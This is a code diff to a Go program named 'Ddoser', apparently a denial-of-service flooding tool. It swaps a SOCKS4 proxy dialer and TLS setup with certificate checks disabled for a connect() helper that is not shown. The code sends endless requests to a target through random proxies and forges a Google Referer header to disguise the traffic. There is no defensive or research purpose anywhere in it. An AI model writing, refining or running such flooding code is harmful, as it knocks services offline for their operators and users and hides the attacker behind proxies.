@@ -1,14 +1,11 @@
 package main
 
 import (
-	"crypto/tls"
 	"fmt"
 	"net/http"
 	"net/url"
 	"os"
 	"time"
-
-	"github.com/gamexg/proxyclient"
 )
 
 type Ddoser struct {
@@ -46,21 +43,10 @@ func (d *Ddoser) Run() {
 			req.Header.Set("Referer", "https://www.google.com/")
 
 			for {
-				dialer, err := proxyclient.NewProxyClient("socks4://" + random(d.proxies))
+				conn, err := connect(random(d.proxies), d.url)
+
 				if err != nil {
 					continue
-				}
-
-				conn, err := dialer.DialTimeout("tcp", req.URL.Host, 5*time.Second)
-				if err != nil {
-					continue
-				}
-
-				if req.URL.Scheme == "https" {
-					conn = tls.Client(conn, &tls.Config{
-						ServerName:         req.URL.Hostname(),
-						InsecureSkipVerify: true,
-					})
 				}
 
 				func() {
